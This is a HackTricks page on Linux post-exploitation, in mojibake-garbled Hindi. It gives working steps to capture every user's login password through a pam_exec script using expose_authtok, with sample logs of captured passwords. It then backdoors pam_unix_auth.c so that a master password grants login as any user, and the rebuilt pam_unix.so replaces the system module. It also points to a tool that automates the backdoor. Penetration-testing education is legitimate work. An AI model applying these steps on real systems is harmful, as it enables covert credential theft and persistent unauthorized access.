# рд▓рд┐рдирдХреНрд╕ рдкреЛрд╕реНрдЯ-рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреЗрд╢рди

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж рдЯреНрд╡рд┐рдЯрд░ ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П рдЯреНрд╡рд┐рдЪ ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе рдпреВрдЯреНрдпреВрдм ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛** рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**рдж рдкреАрдПрдПрд╕ рдлреИрдорд┐рд▓реА**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**рдПрдирдПрдлрдЯреАрдПрд╕**](https://opensea.io/collection/the-peass-family)

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ рдкреАрдПрдПрд╕ рдФрд░ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ [рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕-рдХреНрд▓рд╛рдЙрдб рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>

## PAM рдХреЗ рд╕рд╛рде рд▓реЙрдЧрдСрди рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рд╕реНрдирд┐рдл рдХрд░реЗрдВ

рдЪрд▓реЛ PAM рдореЙрдбреНрдпреВрд▓ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ рддрд╛рдХрд┐ рд╣рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рд▓реЙрдЧ рдХрд░реЗрдВред рдпрджрд┐ рдЖрдкрдХреЛ рдкрддрд╛ рдирд╣реАрдВ рд╣реИ рдХрд┐ PAM рдХреНрдпрд╛ рд╣реИ, рддреЛ рджреЗрдЦреЗрдВ:

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдо рдПрдХ рдмреИрд╢ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрдирд╛рддреЗ рд╣реИрдВ рдЬреЛ рд╣рд░ рдирдИ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╣реЛрдиреЗ рдкрд░ рдЖрд╡рдВрдЯрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
```
рдкрд░рд┐рд╡рд░реНрддрдирд╢реАрд▓рддрд╛ рдЪрд░реЛрдВ рдХреЗрд╡рд▓ PAM рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╣реЛрдВрдЧреЗ рдФрд░ `pam_exec.so` рдореЙрдбреНрдпреВрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдкрд▓рдмреНрдз рд╣реЛрдВрдЧреЗред

рдпрд╣рд╛рдВ рдЪрд░реЛрдВ рдХрд╛ рдЕрд░реНрде рд╣реИ:

* **$PAM\_USER:** рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдирд╛рдо рдЬреЛ рджрд░реНрдЬ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред
* **$PAM\_RHOST:** рд░рд┐рдореЛрдЯ рд╣реЛрд╕реНрдЯ (рд╕рд╛рдорд╛рдиреНрдпрддрдГ IP рдкрддрд╛)
* **$(cat -):** рдпрд╣ `stdin` рдХреЛ рдкрдврд╝рддрд╛ рд╣реИ, рдФрд░ рдЗрд╕рдореЗрдВ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рджреНрд╡рд╛рд░рд╛ рдкрдХрдбрд╝рд╛ рдЧрдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рд╣реЛрдЧрд╛
* рдкрд░рд┐рдгрд╛рдореЛрдВ рдХреЛ `/var/log/toomanysecrets.log` рдкрд░ рдПрдХ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдкрд╛рдЗрдк рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ

рдлрд╝рд╛рдЗрд▓ рдХреЛ **рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкрдврд╝рдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ** рдХреЗ рд▓рд┐рдП, рдЗрд╕реЗ рдкрд╣рд▓реЗ рд╕реЗ рдмрдирд╛ рд▓реЗрдВ рдФрд░ `chmod` рдЪрд▓рд╛рдПрдВ, рдЙрджрд╛ред:
```bash
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
```
рдЕрдЧрд▓реЗ, PAM рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, `pam_exec` рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЖрд╣реНрд╡рд╛рдирд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

`/etc/pam.d/` рдореЗрдВ рдХрдИ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реЛрддреА рд╣реИрдВ, рдФрд░ рд╣рдо `common-auth` рдХреЛ рдЪреБрдирддреЗ рд╣реИрдВред
```
sudo nano /etc/pam.d/common-auth
```
рдлрд╝рд╛рдЗрд▓ рдХреЗ рдиреАрдЪреЗ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдореЙрдбреНрдпреВрд▓ рдЬреЛрдбрд╝реЗрдВ:

`auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh`

рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХрд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрд░реНрде рд╣реИ:

* **optional:** рдпрджрд┐ рдХреЛрдИ рддреНрд░реБрдЯрд┐ рд╣реЛ рддреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд┐рдлрд▓ рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП (рдпрд╣ рдПрдХ рдЖрд╡рд╢реНрдпрдХ рдЪрд░рдг рдирд╣реАрдВ рд╣реИ)
* **pam\_exec.so:** рдпрд╣ рд▓рд┐рд╡рд┐рдВрдЧ рдСрдл рдж рд▓реИрдВрдб рдкреИрдо рдореЙрдбреНрдпреВрд▓ рд╣реИ рдЬреЛ рд╡рд┐рднрд┐рдиреНрди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЖрдордВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ
* **expose\_authtok:** рдпрд╣ рдЯреНрд░рд┐рдХ рд╣реИ рдЬреЛ `stdin` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ
* **quiet:** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХреЛрдИ рддреНрд░реБрдЯрд┐ рдирд╣реАрдВ рджрд┐рдЦрд╛рдПрдВ (рдпрджрд┐ рдХреБрдЫ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ рддреЛ)
* рдЕрдВрддрд┐рдо рддрд░реНрдХ рдкрд┐рдЫрд▓реЗ рдмрдирд╛рдП рдЧрдП рд╢реИрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реИ

![](<../../.gitbook/assets/image (375).png>)

рдЕрдВрдд рдореЗрдВ, рдлрд╝рд╛рдЗрд▓ рдХреЛ рдХреНрд░рд┐рдпрд╛рд╢реАрд▓ рдмрдирд╛рдПрдВ:

`sudo chmod 700 /usr/local/bin/toomanysecrets.sh`

рдЕрдм, рдЗрд╕реЗ рдПрдХ рджреВрд╕рд░реЗ рдорд╢реАрди рд╕реЗ ssh рдХрд░рдХреЗ рдпрд╛ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рд▓реЙрдЧрд┐рди рдХрд░рдХреЗ рдЗрд╕реЗ рдЖрдЬрд╝рдорд╛рдПрдВред

рдФрд░ рдлрд┐рд░ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдкрд░ рдирдЬрд╝рд░ рдбрд╛рд▓реЗрдВ:
```
$ sudo cat /var/log/toomanysecrets.log
Sun Jun 26 23:36:37 PDT 2022 tom, Trustno1!, From: 192.168.1.149
Sun Jun 26 23:37:53 PDT 2022 tom, Trustno1!, From:
Sun Jun 26 23:39:12 PDT 2022 tom, Trustno1!, From: 192.168.1.149
```
### PAM рдХреЛ Backdoor рдХрд░рдирд╛

рдЪрд▓реЛ PAM рдХреЗ рд╕реНрд░реЛрдд рдореЗрдВ рдЬрд╛рдПрдБ (рдЖрдкрдХреЗ рдбрд┐рд╕реНрдЯреНрд░реЛ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░реЗрдЧрд╛, рдЕрдкрдиреЗ рд╡рд░реНрдЬрди рдирдВрдмрд░ рдХреЛ рд▓реЗрдВ...) рдФрд░ pam\_unix\_auth.c рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд╛рдЗрди рдирдВрдмрд░ 170/180 рдХреЗ рдЖрд╕рдкрд╛рд╕ рджреЗрдЦреЗрдВ:
```
vi modules/pam_unix/pam_unix_auth.c
```
![](<../../.gitbook/assets/image (651).png>)

рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реЗ рдмрджрд▓реЗрдВ:

![](<../../.gitbook/assets/image (638) (2) (2).png>)

рдЗрд╕рд╕реЗ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **"0xMitsurugi" рдкрд╛рд╕рд╡рд░реНрдб** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдЧ рдЗрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдЧреАред

`pam_unix_auth.c` рдХреЛ рдкреБрдирдГ рдХрдВрдкрд╛рдЗрд▓ рдХрд░реЗрдВ рдФрд░ pam\_unix.so рдлрд╝рд╛рдЗрд▓ рдХреЛ рдмрджрд▓реЗрдВ:
```bash
make
sudo cp \
/home/mitsurugi/PAM/pam_deb/pam-1.1.8/modules/pam_unix/.libs/pam_unix.so \
/lib/x86_64-linux-gnu/security/
```
{% hint style="info" %}
рдЖрдк рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor) рдХреЗ рд╕рд╛рде рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

## рд╕рдВрджрд░реНрдн

* [https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)
* [https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ**ред

</details>
